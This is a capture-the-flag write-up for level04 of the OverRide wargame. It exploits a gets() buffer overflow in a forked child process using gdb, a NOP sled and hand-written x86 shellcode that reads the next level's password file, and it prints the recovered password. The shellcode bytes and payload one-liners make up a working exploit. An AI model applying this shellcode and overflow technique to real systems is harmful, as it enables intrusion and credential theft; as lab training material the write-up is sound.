In this level, the binary ask for a Shellcode, and wait for an input in STDIN.

	level04@OverRide:~$ ./level04 
	Give me some shellcode, k
	124
	child is exiting...

We have an hint there **child is exiting** let's check the code with Ghidra.

```c
undefined4 main(void)

{
  int iVar1;
  ...
  local_14 = fork(); // Okay so there is a child created there.
  ...
  if (local_14 == 0) {
    prctl(1,1);
    ptrace(PTRACE_TRACEME,0,0,0);
    puts("Give me some shellcode, k");
    gets(local_a0); // This function is breakable !
  }
  else {
    do {
	  ...
      if (((local_a4 & 0x7f) == 0) ||
         (local_1c = local_a4, '\0' < (char)(((byte)local_a4 & 0x7f) + 1) >> 1)) {
        puts("child is exiting...");
        return 0;
      }
      local_18 = ptrace(PTRACE_PEEKUSER,local_14,0x2c,0);
    } while (local_18 != 0xb);
    puts("no exec() for you"); // Didn't saw that in the prompt, it's weird.
    kill(local_14,9);
  }
  return 0;
}
```

There is a lot of garbage here but we found some intersting line !\
After some research we found **set follow-fork-mode child** that will help us see actually what happend in child.

+ gets(local_a0);
This line can be overflowed since it doesn't limit the size of the input with the one of the buffer. With that we can overwrite the return value.

Let's check in gdb the size needed for our payload.

	(gdb) set follow-fork-mode child
	(gdb) run
	Starting program: /home/users/level04/level04 
	[New process 1880]
	Give me some shellcode, k
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB

	Program received signal SIGSEGV, Segmentation fault.
	[Switching to process 1880]
	0x42424141 in ?? ()

After 156 char we can rewrite with whatever we want.\
Since there is no function using system or anything like that we must write our shellcode.

+ puts("no exec() for you");
Since the line there appear when we use a basic shellcode /bin/sh, we'll have to use a shellcode that directly cat the .pass of the next level.

	level04@OverRide:~$ export SHELLCODE=`python -c 'print "\x90" * 242 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`

Now let's find the adress of our shellcode in gdb using **x/20s ((char **)*environ)**.

	(gdb) b main
	Breakpoint 1 at 0x80486cd
	(gdb) run
	Starting program: /home/users/level04/level04 

	Breakpoint 1, 0x080486cd in main ()
	(gdb) x/20s ((char **)*environ)
	0xffffd792:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
	0xffffd85a:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311̀\211\306\353\006\260\001\061\333̀\211\363\260\003\203\354\001\215\f$\262\001̀1\333\071\303t\346\260\004\263\001\262\001̀\203\304\001\353\337\350\311\377\377\377/home/users/level05/.pass"
	0xffffd8e9:	 "SHELL=/bin/bash"
	0xffffd8f9:	 "TERM=xterm-256color"
	0xffffd90d:	 "SSH_CLIENT=192.168.56.1 42612 4242"
	0xffffd930:	 "SSH_TTY=/dev/pts/0"
	0xffffd943:	 "USER=level04"
	...

As we can see our adress will be 0xffffd85a.

	level04@OverRide:~$ python -c 'print "B" * 156 + "\x5a\xd8\xff\xff"' | ./level04
	Give me some shellcode, k
	3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
	child is exiting...

Let's head to the next level.